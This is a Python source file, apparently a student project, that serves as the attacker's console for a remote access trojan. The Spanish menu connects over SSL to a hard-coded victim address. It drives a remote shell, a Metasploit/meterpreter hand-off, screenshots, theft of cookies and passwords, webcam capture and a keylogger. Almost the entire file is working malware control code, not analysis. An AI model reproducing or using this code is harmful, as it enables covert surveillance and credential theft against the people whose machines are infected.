#!/usr/bin/python
# -*- coding: utf-8 -*-
'''
	Este es el script del usuario, o atacante, como usted quiera verse.

	Simplemente siga el menu, por favor no cancele el proceso con una senal, seamos civilizados :)
'''

###FYI
victim='192.168.47.144'
puerto=6116

def info():
	print '''

	SALUDOS, este es el proyecto del tercer modulo.

		Integrantes del equipo:
			 -Fernando
			 -Diego
			 -Manuel

			 PBSCG10!

		FACTA, NON VERBA!

	'''

def salir():
	print '''
		
            (\;/)
           oo   \//,        _
         ,/_;~      \,     / '
         "'    (  (   \    !
               //  \   |__.'
             '~  '~----''

         AUFWIEDERSEHEN...
	'''	

def trasera(sslSock):
	from OpenSSL import SSL  
	import socket  
	import os  
	import sys
 
	while True:  
	        try:
	            cmd = raw_input('RAT@infectado# ')
	            if cmd.isdigit():
	            	sslSock.send('date')
	            elif cmd == 'quit' or cmd ==  'exit' or cmd ==  'q':
	            	return
	            else:
	            	sslSock.send(cmd)
	            data = sslSock.recv(66384)
	            if data=='\n':
	            	sslSock.send(cmd)
	            else:
	            	print data
	        except KeyboardInterrupt:
	        	return


def camara():
	import os
	os.sys("python camc.py")

def menu():
	from OpenSSL import SSL  
	import socket  
	import os  
	import sys
	import threading
	ADDRESS = ('192.168.47.144',6116)
	while 1:
		print '''
	        	(_)_(_)
	                 (o o)
	                ==\o/==

		Bienvenido atacante...
			
			Elige una opcion:

			1) Backdoor
			2) Metasploit
			3) Screenshots
			4) Cookies
			5) Passwords
			6) Audio/Video
			7) Keylogger
			8) Cifrar
			9) Informacion del proyecto
			0) Salir

		''' 
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
		ctx = SSL.Context(SSL.SSLv23_METHOD)  
		ctx.use_certificate_file('cert.pem')  
		sslSock = SSL.Connection(ctx, sock)  
		try:
			eleccion = int(raw_input('>>> '))
		except:
			eleccion = -1
		if eleccion == 0:
			sslSock.close()
			salir()
			exit(0)
		elif eleccion == 1:
			try:  
				sslSock.connect(ADDRESS)
				raw_input("Procure no cometer errores, este backdoor es muy exigente :)... [ENTER]\n")
				sslSock.write('1')
				trasera(sslSock)
				sslSock.close()
			except:
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
		elif eleccion == 2:
			try:  
				sslSock.connect(ADDRESS)  
				raw_input("Antes de continuar, configure meterpreter ;), puerto 4444... [ENTER]")
				sslSock.write('2')
				msg=sslSock.recv(1024)
				print msg+'\n'
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
			except:
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
		elif eleccion == 3:
			try:  
				sslSock.connect(ADDRESS)  
				raw_input("Esta a punto de automatizar la captura de pantalla... [ENTER]")
				sslSock.write('3')
				msg=sslSock.recv(1024)
				print msg+'\n'
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
			except:
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
		elif eleccion == 4:
			try:
				sslSock.connect(ADDRESS)  
				raw_input("Esta a punto de hurtar cookies... [ENTER]")
				sslSock.write('4')
				msg=sslSock.recv(1024)
				print msg+'\n'
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
			except:
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
		elif eleccion == 5:
			try:
				sslSock.connect(ADDRESS)  
				raw_input("Esta a punto de hurtar passwords... [ENTER]")
				sslSock.write('5')
				msg=sslSock.recv(1024)
				print msg+'\n'
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
			except:
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
		elif eleccion == 6:
			try:
				sslSock.connect(ADDRESS)  
				raw_input("Esta a punto de hurtar la camara... [ENTER]")
				sslSock.write('6')
				msg=sslSock.recv(1024)
				print msg+'\n'
				tt=threading.Thread(target=camara,name='VeoTuCam')
				tt.setDaemon(True)
				tt.start()
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
			except:
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
		elif eleccion == 7:
			try: 
				sslSock.connect(ADDRESS)  
				raw_input("Esta a punto de hurtar el teclado... [ENTER]")
				sslSock.write('7')
				msg=sslSock.recv(1024)
				print msg+'\n'
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
			except:
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
		elif eleccion == 8:
			print "No implementado aun :)"
			raw_input("Presione una tecla para continuar...")
			os.system('clear')
		elif eleccion == 9:
			info()
			raw_input("Presione una tecla para continuar...")
			os.system('clear')
			sslSock.close()
		else:
			print "opcion incorrecta"
			raw_input("Presione una tecla para continuar...")
			os.system('clear')

if __name__=='__main__':
	menu()
